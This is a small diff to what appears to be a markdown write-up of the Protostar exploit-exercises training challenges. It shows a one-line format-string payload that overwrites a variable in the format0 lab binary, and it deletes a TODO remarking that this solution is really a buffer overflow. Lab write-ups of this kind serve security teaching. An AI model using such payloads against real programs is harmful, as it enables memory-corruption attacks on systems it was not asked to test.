@@ -67,9 +67,6 @@ $ ./format0 `python -c "print('%64d\xef\xbe\xad\xde')`
 you have hit the target correctly :)
 ~~~
 
-:TODO: The solution above is a buffer overflow, look into 
-solving the challenge without using a buffer overflow
-
 ## [format1](https://exploit-exercises.com/protostar/format1)
 
 * * *
